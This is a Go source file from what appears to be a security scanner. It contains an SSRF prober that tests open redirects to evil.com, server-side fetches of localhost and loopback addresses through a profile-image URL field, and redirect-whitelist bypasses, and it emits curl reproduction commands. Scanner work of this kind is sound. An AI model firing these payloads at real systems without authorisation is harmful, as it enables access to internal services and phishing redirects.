package probers

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/ouroboros-security/ouroboros/pkg/types"
)

// SSRFProber tests for Server-Side Request Forgery vulnerabilities.
type SSRFProber struct{}

func (p *SSRFProber) Name() string { return "ssrf" }

func (p *SSRFProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	findings = append(findings, p.testOpenRedirect(cfg)...)
	findings = append(findings, p.testProfileImageURL(cfg)...)
	findings = append(findings, p.testRedirectWhitelistBypass(cfg)...)

	return findings
}

func (p *SSRFProber) testOpenRedirect(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	redirectPayloads := []struct {
		target string
		desc   string
	}{
		{"https://evil.com", "external URL redirect"},
		{"//evil.com", "protocol-relative redirect"},
		{cfg.BaseURL + "/ftp", "same-origin redirect to sensitive path"},
	}

	for _, rp := range redirectPayloads {
		encoded := url.QueryEscape(rp.target)
		fullURL := fmt.Sprintf("%s/redirect?to=%s", cfg.BaseURL, encoded)
		status, headers, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
		if err != nil {
			continue
		}

		location := headers.Get("Location")
		if status >= 300 && status < 400 && location != "" {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Open Redirect - %s", rp.desc),
				"Medium",
				fmt.Sprintf("The redirect endpoint allows redirection to arbitrary URLs: %s", rp.target),
				"/redirect?to=",
				"GET",
				"CWE-601",
				fmt.Sprintf(`curl -I "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - Location: %s", status, location),
				"ssrf",
				0,
			))
		} else if status == 200 {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Open Redirect/SSRF - %s", rp.desc),
				"Medium",
				fmt.Sprintf("The redirect endpoint processes URL: %s and returns content.", rp.target),
				"/redirect?to=",
				"GET",
				"CWE-601",
				fmt.Sprintf(`curl "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
				"ssrf",
				0,
			))
		} else if status == 403 || status == 406 {
			// Whitelist check exists but can be bypassed
			findings = append(findings, MakeFinding(
				"Open Redirect - Whitelist Restriction (Bypassable)",
				"Low",
				"The redirect endpoint has a whitelist restriction, but it may be bypassable using various techniques.",
				"/redirect?to=",
				"GET",
				"CWE-601",
				fmt.Sprintf(`curl -I "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - Blocked but whitelist bypass may be possible: %s", status, truncate(respBody, 100)),
				"ssrf",
				0,
			))
			break
		}
	}

	return findings
}

func (p *SSRFProber) testProfileImageURL(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Test SSRF via profile image URL
	ssrfTargets := []struct {
		url  string
		desc string
	}{
		{"http://localhost:3000/rest/admin/application-version", "localhost SSRF"},
		{"http://127.0.0.1:3000/api/Users", "loopback SSRF"},
		{"http://[::1]:3000/api/Users", "IPv6 loopback SSRF"},
	}

	for _, st := range ssrfTargets {
		body := fmt.Sprintf(`{"imageUrl":"%s"}`, st.url)
		status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/profile/image/url",
			strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
		if err != nil {
			continue
		}

		if status == 200 {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("SSRF via Profile Image URL - %s", st.desc),
				"High",
				fmt.Sprintf("The profile image URL endpoint fetches arbitrary URLs server-side, enabling SSRF to internal services: %s", st.url),
				"/profile/image/url",
				"POST",
				"CWE-918",
				fmt.Sprintf(`curl -X POST %s/profile/image/url -H "Content-Type: application/json" -H "Authorization: %s" -d '{"imageUrl":"%s"}'`, cfg.BaseURL, cfg.AuthToken, st.url),
				fmt.Sprintf("HTTP %d - Server fetched internal URL: %s", status, truncate(respBody, 200)),
				"ssrf",
				0,
			))
			break
		}
	}

	return findings
}

func (p *SSRFProber) testRedirectWhitelistBypass(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Try various whitelist bypass techniques for the redirect endpoint
	bypassPayloads := []struct {
		payload string
		desc    string
	}{
		{"https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm", "whitelisted domain (blockchain.info)"},
		{"https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW", "whitelisted domain (explorer.dash.org)"},
		{"https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6", "whitelisted domain (etherscan.io)"},
		{cfg.BaseURL + "%2f%2fevil.com", "double-encoded path bypass"},
	}

	for _, bp := range bypassPayloads {
		encoded := url.QueryEscape(bp.payload)
		fullURL := fmt.Sprintf("%s/redirect?to=%s", cfg.BaseURL, encoded)
		status, headers, _, err := cfg.DoRequest("GET", fullURL, nil, nil)
		if err != nil {
			continue
		}

		location := headers.Get("Location")
		if status >= 300 && status < 400 && location != "" {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Redirect Whitelist Bypass - %s", bp.desc),
				"Medium",
				fmt.Sprintf("The redirect whitelist can be bypassed using: %s", bp.payload),
				"/redirect?to=",
				"GET",
				"CWE-601",
				fmt.Sprintf(`curl -I "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - Redirected to: %s", status, location),
				"ssrf",
				0,
			))
		}
	}

	return findings
}
